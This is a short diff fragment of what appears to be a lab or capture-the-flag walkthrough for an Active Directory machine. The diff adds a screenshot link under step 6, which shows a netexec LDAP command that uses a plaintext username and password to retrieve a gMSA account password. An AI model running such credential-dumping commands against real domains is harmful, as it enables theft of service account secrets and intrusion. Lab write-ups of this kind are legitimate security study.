@@ -45,7 +45,7 @@
 
 6. Get GMSA password using netexec
 `nxc ldap 10.129.47.3 -u alfred -p basketball --gmsa`
-
+![image](https://github.com/user-attachments/assets/cbdf43c4-6647-4fa9-a0a3-e2b0588ebf90)
 
 7. 
 
